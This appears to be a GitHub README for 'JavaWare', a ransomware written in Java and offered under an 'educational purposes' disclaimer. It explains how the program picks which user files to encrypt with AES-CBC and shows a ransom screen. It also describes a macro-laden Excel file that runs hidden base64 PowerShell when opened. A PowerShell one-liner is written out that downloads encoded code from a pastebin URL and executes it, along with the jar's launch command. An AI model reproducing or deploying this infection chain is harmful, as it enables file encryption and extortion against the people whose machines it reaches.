# JavaWare
### A Ransomware Built in Java

#### Disclaimer
> I built this purely for **educational purposes**. I take no responsibility and/or liability for how you choose to use any of the code available here. If executing the ransomware, please do not do so on your own machine as it will encrypt your files. Although I did include a function to decrypt, I am in no way responsible. 

JavaWare is a ransomware which will observe your system, learn which files you use, and then encrypt your machine. Once all files have been encrypted it will launch the payload screen. 

![alt text](https://raw.githubusercontent.com/kyralmozley/JavaWare/V1.0/Screenshots/Pay%20Load.png "Launch Screen")

### How does it learn which files I use?
> Maths. 

### How does it encrypt? :lock:
> AES 128 bit Encryption in CBC Mode (Counter Block Mode ) PKCS5 Padding
*AES* is a symmetric encryption algorithm which works on blocks of a fixed size (16 bytes for AES128). *Padding* (PKCS5) is used if the block is less than 16 bytes long. We split the stream into 16 byte blocks, which is encrypted using AES and the result is XORed with the next block in the stream before it is encrypted. For the first block, it XORs it with an *initialization vector*, a random 16 byte value. 

### What does it encrypt?
> *FileTypes.java* defines what type of files to encrypt, it includes common document types and so will avoid program files to ensure your system is still functional. Similarly, *AvoidedDir.java* includes directories to avoid in traversal, such as *Windows* and *Program Files*. The PowerShell script is: 
```powershell
Powershell Invoke-Expression -Command  $([string]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri https://pastebin.com/raw/1JDNWfqP).content)
```

### How does it launch?
The Microsoft Excel file, *August Report.xlsm* contains a Macro which is run on Workbook Open. Encoded Base64 PowerShell code is hidden within this file under the 'Author' field. So the macro calls a function which gets the author, decodes it, and then runs the shell. 
###



java --module-path "C:\Users\Admin\Desktop\JavaWare\javafx-sdk-11.0.2\lib\" --add-modules=javafx.controls -jar Users\Admin\Desktop\JavaWare\JavaWare.jar


references: 
https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf
